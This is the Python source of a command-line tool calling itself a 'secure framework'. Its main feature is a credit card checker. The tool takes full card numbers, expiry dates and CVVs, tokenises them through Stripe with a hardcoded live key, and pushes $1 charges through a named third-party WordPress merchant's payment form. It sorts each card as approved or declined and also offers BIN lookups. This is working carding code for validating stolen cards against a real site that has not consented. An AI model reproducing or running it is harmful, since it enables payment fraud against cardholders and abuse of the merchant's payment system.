import os
import sys
import re
import time
import json
import socket
import hashlib
import platform
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("ERROR: requests library not found. Install: pip install requests")
    sys.exit(1)

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        BLACK = '\033[30m'; RED = '\033[31m'; GREEN = '\033[32m'
        YELLOW = '\033[33m'; BLUE = '\033[34m'; MAGENTA = '\033[35m'
        CYAN = '\033[36m'; WHITE = '\033[37m'; RESET = '\033[39m'
        LIGHTBLACK_EX = '\033[90m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; NORMAL = '\033[22m'
        RESET_ALL = '\033[0m'

VERSION = "1.0.0"
AUTHOR = "ocsten"
CHANNEL = "t.me/ocsten"
GITHUB = "github.com/ocsten"
TOOL_NAME = "OCSTEN SECURE FRAMEWORK"

MAX_RETRIES = 3
TIMEOUT_SECONDS = 30

CONFIG_DIR = os.path.expanduser("~/.ocsten")
LOG_DIR = os.path.join(CONFIG_DIR, "logs")
CACHE_DIR = os.path.join(CONFIG_DIR, "cache")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")

for directory in [CONFIG_DIR, LOG_DIR, CACHE_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory, mode=0o755, exist_ok=True)

class Logger:
    def __init__(self, log_file: Optional[str] = None):
        self.log_file = log_file or os.path.join(LOG_DIR, f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def _write(self, level: str, message: str):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    
    def log(self, level: str, message: str):
        levels = {'INFO': Fore.CYAN, 'SUCCESS': Fore.GREEN, 'WARNING': Fore.YELLOW, 'ERROR': Fore.RED}
        prefix = levels.get(level, Fore.WHITE)
        print(f"{prefix}{level}{Fore.RESET}: {message}")
        self._write(level, message)
    
    def info(self, msg): self.log('INFO', msg)
    def success(self, msg): self.log('SUCCESS', msg)
    def warning(self, msg): self.log('WARNING', msg)
    def error(self, msg): self.log('ERROR', msg)

class SessionManager:
    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        retry = Retry(total=MAX_RETRIES, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def get(self, url: str, **kwargs):
        try:
            return self.session.get(url, timeout=TIMEOUT_SECONDS, **kwargs)
        except Exception as e:
            return None
    
    def post(self, url: str, data=None, json=None, **kwargs):
        try:
            return self.session.post(url, data=data, json=json, timeout=TIMEOUT_SECONDS, **kwargs)
        except Exception as e:
            return None

class UI:
    @staticmethod
    def clear():
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def header():
        print(f"\n{Fore.CYAN}{Style.BRIGHT}{TOOL_NAME}  v{VERSION}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTBLACK_EX}developer: {AUTHOR}  |  channel: {CHANNEL}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTBLACK_EX}github: {GITHUB}{Style.RESET_ALL}")
        print("-" * 50)
    
    @staticmethod
    def menu():
        print(f"\n{Fore.WHITE}1.  Check Card{Fore.RESET}")
        print(f"{Fore.WHITE}2.  Lookup BIN{Fore.RESET}")
        print(f"{Fore.WHITE}3.  System Info{Fore.RESET}")
        print(f"{Fore.WHITE}4.  Network Test{Fore.RESET}")
        print(f"{Fore.WHITE}5.  View Logs{Fore.RESET}")
        print(f"{Fore.WHITE}6.  Clear Screen{Fore.RESET}")
        print(f"{Fore.WHITE}7.  Exit{Fore.RESET}")
        print("-" * 50)
    
    @staticmethod
    def prompt():
        return f"{Fore.CYAN}command{Fore.RESET} > "
    
    @staticmethod
    def result(data: Dict, title: str = "Result"):
        print(f"\n{Fore.WHITE}{title}{Fore.RESET}")
        print("-" * 40)
        for key, value in data.items():
            print(f"{Fore.LIGHTBLACK_EX}{key}{Fore.RESET}: {value}")
        print("-" * 40)
    
    @staticmethod
    def progress(current: int, total: int):
        percent = (current / total) * 100 if total > 0 else 0
        bar_length = 30
        filled = int(bar_length * current // total) if total > 0 else 0
        bar = '#' * filled + '-' * (bar_length - filled)
        print(f"\rprogress: [{bar}] {percent:.0f}%", end='', flush=True)

@dataclass
class CardData:
    number: str
    month: str
    year: str
    cvv: str
    bin: str = field(init=False)
    valid_luhn: bool = field(init=False)
    
    def __post_init__(self):
        self.bin = self.number[:6] if len(self.number) >= 6 else ""
        self.valid_luhn = self._check_luhn()
    
    def _check_luhn(self) -> bool:
        digits = [int(d) for d in self.number if d.isdigit()]
        if len(digits) < 13:
            return False
        checksum = 0
        reverse_digits = digits[::-1]
        for i, digit in enumerate(reverse_digits):
            if i % 2 == 1:
                doubled = digit * 2
                checksum += doubled - 9 if doubled > 9 else doubled
            else:
                checksum += digit
        return checksum % 10 == 0

class OCSTENFramework:
    def __init__(self):
        self.logger = Logger()
        self.session = SessionManager()
        self.running = True
        self.start_time = datetime.now()
        self.ui = UI()
    
    def _get_input(self, prompt: str = "") -> str:
        try:
            if prompt:
                print(prompt)
            return input(self.ui.prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            return "7"
    
    def _parse_card(self, card_str: str) -> Optional[CardData]:
        numbers = re.findall(r'\d+', card_str)
        if len(numbers) < 4:
            self.logger.error("Incomplete card data")
            return None
        ccn, mm, yy, cvv = numbers[0], numbers[1], numbers[2], numbers[3]
        if len(ccn) < 13 or len(ccn) > 19:
            self.logger.error("Invalid card number length")
            return None
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            self.logger.error("Invalid month")
            return None
        if not yy.isdigit() or len(yy) not in [2, 4]:
            self.logger.error("Invalid year")
            return None
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            self.logger.error("Invalid CVV")
            return None
        return CardData(number=ccn, month=mm, year=yy, cvv=cvv)
    
    def _validate_card(self, card: CardData) -> Dict:
        self.logger.info(f"Processing card: {card.number[:6]}XXXXXX{card.number[-4:]}")
        if not card.valid_luhn:
            return {"status": "Invalid", "message": "Luhn checksum failed"}
        
        try:
            # Stripe token generation
            stripe_data = {
                "guid": self._generate_guid(),
                "muid": self._generate_muid(),
                "sid": self._generate_sid(),
                "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
                "card[name]": "John Doe",
                "card[number]": card.number,
                "card[exp_month]": card.month,
                "card[exp_year]": card.year,
                "card[cvc]": card.cvv
            }
            
            token_response = self.session.post(
                'https://api.stripe.com/v1/tokens',
                data=stripe_data
            )
            
            if not token_response or token_response.status_code != 200:
                return {"status": "Error", "message": "Stripe token generation failed"}
            
            token_id = token_response.json().get('id')
            if not token_id:
                return {"status": "Error", "message": "No token received"}
            
            # Payment processing
            payment_data = {
                "action": "wp_full_stripe_payment_charge",
                "formName": "default",
                "formNonce": self._get_form_nonce(),
                "fullstripe_name": "John Doe",
                "fullstripe_email": "john.doe@example.com",
                "fullstripe_custom_amount": "1",
                "fullstripe_amount_index": 0,
                "stripeToken": token_id
            }
            
            payment_response = self.session.post(
                'https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                data=payment_data
            )
            
            if not payment_response:
                return {"status": "Error", "message": "Payment processing failed"}
            
            response_text = payment_response.text.lower()
            
            if 'true' in response_text:
                return {"status": "Approved", "message": "Transaction authorized"}
            elif 'security code' in response_text:
                return {"status": "CCN", "message": "Card number accepted"}
            elif 'false' in response_text:
                return {"status": "Declined", "message": "Transaction declined"}
            else:
                return {"status": "Unknown", "message": "Unexpected response"}
                
        except Exception as e:
            self.logger.error(f"Validation error: {str(e)[:50]}")
            return {"status": "Error", "message": f"Exception: {str(e)[:50]}"}
    
    def _generate_guid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _generate_muid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _generate_sid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _get_form_nonce(self) -> str:
        try:
            response = self.session.get("https://www.hwstjohn.com/pay-now/")
            if response:
                nonce_match = re.search(r'formNonce" value="([^\'" >]+)', response.text)
                if nonce_match:
                    return nonce_match.group(1)
        except Exception:
            pass
        return "default_nonce"
    
    def _check_bin(self, bin_code: str) -> Dict:
        try:
            response = self.session.get(f'https://bins.ws/search?bins={bin_code[:6]}')
            if response:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                page_div = soup.find("div", {"class": "page"})
                if page_div:
                    text = page_div.text
                    lines = [line.strip() for line in text.split('\n') if line.strip()]
                    result = {}
                    for line in lines:
                        if ':' in line:
                            key, value = line.split(':', 1)
                            result[key.strip()] = value.strip()
                    return result
        except Exception as e:
            self.logger.error(f"BIN lookup error: {str(e)[:50]}")
        
        return {
            "BIN": bin_code[:6],
            "Bank": "Unknown",
            "Country": "Unknown",
            "Type": "Unknown",
            "Brand": "Unknown",
            "Level": "Unknown"
        }
    
    def _system_info(self) -> Dict:
        return {
            "System": platform.system(),
            "Release": platform.release(),
            "Python": platform.python_version(),
            "Uptime": str(datetime.now() - self.start_time).split('.')[0],
            "Logs": LOG_DIR,
            "Cache": CACHE_DIR
        }
    
    def _network_test(self) -> Dict:
        results = {}
        for host in ["google.com", "github.com", "api.stripe.com"]:
            try:
                start = time.time()
                socket.gethostbyname(host)
                results[host] = f"{round((time.time() - start) * 1000, 2)}ms"
            except:
                results[host] = "Failed"
        return results
    
    def _show_logs(self):
        try:
            log_files = sorted([f for f in os.listdir(LOG_DIR) if f.endswith('.log')], reverse=True)
            if not log_files:
                self.ui.result({"message": "No logs found"}, "Log Status")
                return
            latest = os.path.join(LOG_DIR, log_files[0])
            with open(latest, 'r', encoding='utf-8') as f:
                lines = f.readlines()[-20:]
            print(f"\nLog file: {log_files[0]}")
            print("-" * 40)
            for line in lines:
                print(line.strip())
            print("-" * 40)
        except Exception as e:
            self.logger.error(f"Cannot read logs: {str(e)[:50]}")
    
    def main_loop(self):
        while self.running:
            self.ui.clear()
            self.ui.header()
            self.ui.menu()
            choice = self._get_input()
            
            if choice == '1':
                self.ui.clear()
                self.ui.header()
                card_input = input(f"{Fore.CYAN}enter card (number|month|year|cvv){Fore.RESET} > ")
                if card_input:
                    card = self._parse_card(card_input)
                    if card:
                        for i in range(1, 4):
                            self.ui.progress(i, 3)
                            time.sleep(0.3)
                        print()
                        result = self._validate_card(card)
                        data = {
                            "card": f"{card.number[:6]}XXXXXX{card.number[-4:]}",
                            "bin": card.bin,
                            "month/year": f"{card.month}/{card.year}",
                            "status": result.get("status", "Unknown"),
                            "message": result.get("message", "No response")
                        }
                        self.ui.result(data, "Validation Result")
                    else:
                        self.logger.error("Invalid card format")
                input("\npress ENTER to continue...")
            
            elif choice == '2':
                self.ui.clear()
                self.ui.header()
                bin_input = input(f"{Fore.CYAN}enter BIN (first 6 digits){Fore.RESET} > ")
                if bin_input and bin_input[:6].isdigit():
                    data = self._check_bin(bin_input[:6])
                    self.ui.result(data, "BIN Information")
                else:
                    self.logger.error("Invalid BIN")
                input("\npress ENTER to continue...")
            
            elif choice == '3':
                self.ui.clear()
                self.ui.header()
                data = self._system_info()
                self.ui.result(data, "System Information")
                input("\npress ENTER to continue...")
            
            elif choice == '4':
                self.ui.clear()
                self.ui.header()
                data = self._network_test()
                self.ui.result(data, "Network Diagnostics")
                input("\npress ENTER to continue...")
            
            elif choice == '5':
                self.ui.clear()
                self.ui.header()
                self._show_logs()
                input("\npress ENTER to continue...")
            
            elif choice == '6':
                continue
            
            elif choice == '7':
                self.running = False
                print(f"\n{Fore.GREEN}Session terminated. Goodbye.{Fore.RESET}")
                sys.exit(0)
            
            else:
                self.logger.warning(f"Unknown command: {choice}")
                time.sleep(1)

def main():
    try:
        print(f"{Fore.CYAN}Initializing OCSTEN Framework...{Fore.RESET}")
        framework = OCSTENFramework()
        framework.logger.info(f"{TOOL_NAME} started v{VERSION}")
        framework.logger.info(f"System: {platform.system()} {platform.release()}")
        framework.main_loop()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Session interrupted{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Critical error: {str(e)}{Fore.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
